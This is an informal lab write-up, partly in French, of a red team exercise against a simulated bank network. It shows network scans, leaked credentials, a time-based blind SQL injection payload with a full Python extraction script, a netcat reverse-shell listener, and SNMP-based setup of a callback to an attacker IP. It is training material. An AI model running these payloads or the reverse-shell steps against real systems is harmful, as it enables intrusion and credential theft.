In this Red Team exercise, students will simulate a financially motivated Advanced Persistent Threat (APT) attack against "Trust Bank," aiming to compromise the branch manager’s email account and exfiltrate sensitive financial data including internal communications all while maintaining stealth to mimic real-world banking threats like FIN7. The Red Team will go through Initial Access, Privilege Escalation, Lateral Movement & Data Exfiltration.

# Description

To conduct a **targeted cyber operation** against “**Trust Bank**” with the primary goal of **compromising the branch manager’s mailbox** and **exfiltrating sensitive financial data** (e.g., customer records, transaction logs, internal communications). The operation will simulate a **financially motivated Advanced Persistent Threat (APT)** attack, leveraging advanced tradecraft to evade detection while achieving mission objectives.

# Scope of Engagement:

- Target
    - **Primary Objective:** Gain unauthorized mail access to the **branch manager’s account.**
    - **Secondary Objective:** Extract sensitive data (PII, account details, internal memos).
    - **IP Range:** 172.16.100.0/24 (Trust Bank’s internal network segment).
- **Tactics & Techniques (Simulated APT Approach):**
    - **Initial Access:**
        - Exploiting public-facing services.
    - **Privilege Escalation:**
        - Sensitive information disclosure
        - Exploiting misconfigured service permissions.
    - **Lateral Movement:**
        - Weak protocol Implementation
        - SSH Agent Abuse
    - **Data Exfiltration:**
        - Stealthy data compression & exfil via encrypted channels (DNS tunneling, HTTPS).
- **Rules of Engagement (ROE):**
    - **Avoid disruption:** Do not crash systems or trigger incident response unnecessarily.
    - **Legal compliance:** Operate under authorized red team agreements.
- **Deliverables:**
    - **Post-Compromise Report:**
        - Attack timeline & techniques used
        - Security recommendations (patch weak credentials, MFA enforcement).
        - **[IMP] Flag present at the Bank Manager Mailbox**
![[lab1.png]]





# Decouverte du reseaux 
## Enumeration 
### Nmap

Scannons tous les hôtes actifs sur le réseau local **172.16.100.0/24** pour identifier les machines accessibles

```shell
nmap 172.16.100.0/24        
```

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-25 16:01 CEST
Nmap scan report for 172.16.100.1
Host is up (0.22s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE
53/tcp open  domain
80/tcp open  http

Nmap scan report for 172.16.100.25
Host is up (0.20s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE
25/tcp  open  smtp
143/tcp open  imap
993/tcp open  imaps

Nmap scan report for 172.16.100.70
Host is up (0.20s latency).
Not shown: 999 closed tcp ports (reset)
PORT     STATE SERVICE
8080/tcp open  http-proxy

Nmap scan report for 172.16.100.98
Host is up (0.18s latency).
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
1433/tcp open  ms-sql-s
5000/tcp open  upnp
5357/tcp open  wsdapi

Nmap scan report for 172.16.100.102
Host is up (0.21s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE
22/tcp   open  ssh
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
```

La commande a permis d’identifier **5 hôtes actifs** sur le réseau **172.16.100.0/24**. Cela signifie que ces machines ont répondu à des requêtes réseau et ont au moins un port ouvert.

- `172.16.100.1`
- `172.16.100.25`
- `172.16.100.70`
- `172.16.100.98`
- `172.16.100.102`

# Machine 172.16.100.98
## Enumeration 

```
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-info: 
|   172.16.100.98\MSSQLSERVER: 
|     Instance name: MSSQLSERVER
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|     TCP port: 1433
|     Named pipe: \\172.16.100.98\pipe\sql\query
|_    Clustered: false
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-07-04T01:28:55
| Not valid after:  2055-07-04T01:28:55
| MD5:   6f59:6c52:3bde:7eb3:03f2:43c5:86d4:4db8
|_SHA-1: ddf4:261b:fdff:f390:48e6:d13e:73f7:3035:5943:231e
|_ssl-date: 2025-07-25T08:52:56+00:00; -5h18m23s from scanner time.
| ms-sql-ntlm-info: 
|   172.16.100.98\MSSQLSERVER: 
|     Target_Name: SQL-SRV
|     NetBIOS_Domain_Name: SQL-SRV
|     NetBIOS_Computer_Name: SQL-SRV
|     DNS_Domain_Name: SQL-Srv
|     DNS_Computer_Name: SQL-Srv
|_    Product_Version: 10.0.20348
5000/tcp open  http          Werkzeug httpd 3.1.3 (Python 3.13.5)
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
|_http-server-header: Werkzeug/3.1.3 Python/3.13.5
|_http-title: SRC BANK
5357/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: -5h18m23s, deviation: 0s, median: -5h18m23s
| smb2-time: 
|   date: 2025-07-25T08:52:49
|_  start_date: N/A
```

Le scan révèle que l’hôte 172.16.100.98 expose plusieurs services critiques Windows, dont SMB et SQL Server 2019, ainsi que deux interfaces HTTP, ce qui en fait une cible potentielle pour une exploitation approfondie.
la liste des ports ouverts : 135, 139, 445, 1433, 5000, 5357

# Serveur Web 
je suis alle sur le site internet 
j'ai cree un compte je me suis connecte j'ai rien trouve 

![[Pasted image 20250725161630.png]]

j'ai fais une analyse des sou-domaine j'ai rien trouve d'interressant 
![[Pasted image 20250807140519.png]]
 apres la verification du code source j'ai trouve ceci 
 
http://172.16.100.98:5000/static/.env/Artifact_deployment.txt

![[Pasted image 20250807140201.png]]

[DEBUG] Injected credentials:
  usr: YWRtaW4ucmljaGFyZA==
  pss: QWRtaW5AU2VjdXJlOTk=
Les identifiants injectés sont codés en **Base64** :
- `usr` = `admin.richard`
- `pss` = `Admin@Secure99`
je me suis connecte avec ces identifiant 

![[Pasted image 20250807140333.png]]

## Blind SQL injection
_Blind SQL injection_ is a type of SQL injection  where the attacker does not receive an obvious response from the attacked database and instead reconstructs the database structure step-by-step by observing the behavior of the database server and the application
J'ai inserer `'` dans le formulaire et j'ai constate que l'input est succesible d'une attaque sql

' IF EXISTS (SELECT * FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name = 'users' AND column_name = 'password_hash') WAITFOR DELAY '0:0:10'--

![[Pasted image 20250807142357.png]]

# Python Code to Extract the "sa" Credentials from the table via Blind SQLi

import requests
import time

url = "http://172.16.100.98:5000/admin/dashboard"

```
# Replace this with your session cookie
session_cookie = {
    "session": "eyJfcGVybWFuZW50Ijp0cnVlLCJsb2dpbl90aW1lIjoiMjAyNS0wOC0wN1QwMzo1MzoxNi41MDY0ODYiLCJ1c2VyX2lkIjoxN30.aJSFnQ.nunwVoFvyy0bKnab_aX1eV3FM2w"
}

DELAY_THRESHOLD = 4.5

# Target user and field
target_user = "sa"
target_field = "password_hash"

charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$_!%^&*()-=+"

# Result storage
extracted = ""

# How many characters of the field to extract
MAX_LENGTH = 50

print("[*] Starting time-based blind SQLi on authenticated endpoint...\n")

for position in range(1, MAX_LENGTH + 1):
    found = False

    for char in charset:
        payload = (
            f"' IF (SUBSTRING(CONVERT(varchar, (SELECT {target_field} FROM users "
            f"WHERE username = '{target_user}')) COLLATE Latin1_General_CS_AS, {position}, 1) = '{char}') "
            f"WAITFOR DELAY '0:0:5'--"
        )

        print(f"[*] Testing position {position} with character: '{char}'")

        try:
            start = time.time()
            r = requests.get(url, params={'search': payload}, cookies=session_cookie)
            elapsed = time.time() - start

            print(f"    → Response time: {elapsed:.2f} sec")

            if elapsed > DELAY_THRESHOLD:
                extracted += char
                print(f"[+] Match at position {position}: '{char}' → {extracted}\n")
                found = True
                break

        except Exception as e:
            print(f"[!] Request error at position {position} with '{char}': {e}")
            time.sleep(2)

    if not found:
        print(f"[!] No match at position {position}. Assuming end of value.")
        break

print(f"\n[✔] Extraction complete: {extracted}")
```
une **attaque par injection SQL à l’aveugle (Blind SQL Injection)**, de type **"time-based"**, sur une application web.

![[Pasted image 20250807182626.png]]
sa:MSSqlServer@963

```
nc -lvnp 443 
listening on [any] 443 ...
connect to [10.10.10.10] from (UNKNOWN) [192.168.10.101] 9876
hostname
SQL-Srv
PS C:\Windows\system32> 
```

Machine 172.16.100.70
## Enumeration 
### Nmap
```
sudo nmap -Pn -sU -p 161 172.16.100.70

PORT    STATE SERVICE
161/udp open  snmp
```

![[Pasted image 20250807184900.png]]


```
sudo snmpwalk -v 2c -c public 172.16.100.70         
iso.3.6.1.2.1.1.1.0 = STRING: "SNMP Service"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
iso.3.6.1.2.1.1.3.0 = Timeticks: (219627045) 25 days, 10:04:30.45
iso.3.6.1.2.1.1.4.0 = STRING: "Admin <dev@trust-bank.ad>"
iso.3.6.1.2.1.1.5.0 = STRING: "Passed IP will be logged in the executable file, if sent via POST request."
iso.3.6.1.2.1.1.6.0 = STRING: "http://localhost:8080/submit -d \"user=root&ip=<>&port=<>\","
iso.3.6.1.2.1.1.8.0 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.2.1 = OID: iso.3.6.1.6.3.10.3.1.1
iso.3.6.1.2.1.1.9.1.2.2 = OID: iso.3.6.1.6.3.11.3.1.1
iso.3.6.1.2.1.1.9.1.2.3 = OID: iso.3.6.1.6.3.15.2.1.1
iso.3.6.1.2.1.1.9.1.2.4 = OID: iso.3.6.1.6.3.1
iso.3.6.1.2.1.1.9.1.2.5 = OID: iso.3.6.1.6.3.16.2.2.1
iso.3.6.1.2.1.1.9.1.2.6 = OID: iso.3.6.1.2.1.49
iso.3.6.1.2.1.1.9.1.2.7 = OID: iso.3.6.1.2.1.50
iso.3.6.1.2.1.1.9.1.2.8 = OID: iso.3.6.1.2.1.4
iso.3.6.1.2.1.1.9.1.2.9 = OID: iso.3.6.1.6.3.13.3.1.3
iso.3.6.1.2.1.1.9.1.2.10 = OID: iso.3.6.1.2.1.92
iso.3.6.1.2.1.1.9.1.3.1 = STRING: "The SNMP Management Architecture MIB."
iso.3.6.1.2.1.1.9.1.3.2 = STRING: "The MIB for Message Processing and Dispatching."
iso.3.6.1.2.1.1.9.1.3.3 = STRING: "The management information definitions for the SNMP User-based Security Model."
iso.3.6.1.2.1.1.9.1.3.4 = STRING: "The MIB module for SNMPv2 entities"
iso.3.6.1.2.1.1.9.1.3.5 = STRING: "View-based Access Control Model for SNMP."
iso.3.6.1.2.1.1.9.1.3.6 = STRING: "The MIB module for managing TCP implementations"
iso.3.6.1.2.1.1.9.1.3.7 = STRING: "The MIB module for managing UDP implementations"
iso.3.6.1.2.1.1.9.1.3.8 = STRING: "The MIB module for managing IP and ICMP implementations"
iso.3.6.1.2.1.1.9.1.3.9 = STRING: "The MIB modules for managing SNMP Notification, plus filtering."
iso.3.6.1.2.1.1.9.1.3.10 = STRING: "The MIB module for logging SNMP Notifications."
iso.3.6.1.2.1.1.9.1.4.1 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.2 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.3 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.4 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.5 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.6 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.7 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.8 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.9 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.10 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.25.1.1.0 = Timeticks: (228143547) 26 days, 9:43:55.47
iso.3.6.1.2.1.25.1.2.0 = Hex-STRING: 07 E9 08 07 11 09 13 00 2B 05 1E 
iso.3.6.1.2.1.25.1.3.0 = INTEGER: 393216
iso.3.6.1.2.1.25.1.4.0 = STRING: "BOOT_IMAGE=/boot/vmlinuz-6.8.0-41-generic root=UUID=419ff7ed-938c-4d3b-b665-bf35581c8097 ro quiet splash vt.handoff=7
"
iso.3.6.1.2.1.25.1.5.0 = Gauge32: 2
iso.3.6.1.2.1.25.1.6.0 = Gauge32: 277
iso.3.6.1.2.1.25.1.7.0 = INTEGER: 0
iso.3.6.1.2.1.25.1.7.0 = No more variables left in this MIB View (It is past the end of the MI
```


curl -X POST http://172.16.100.70:8080/submit -d "user=root&ip=10.10.10.10&port=1234"
Stored 10.10.10.10:1234 for root,

Now run this from your machine:
snmpwalk -v2c -c privatestring <target_ip> NET-SNMP-EXTEND-MIB::nsExtendOutput1Line
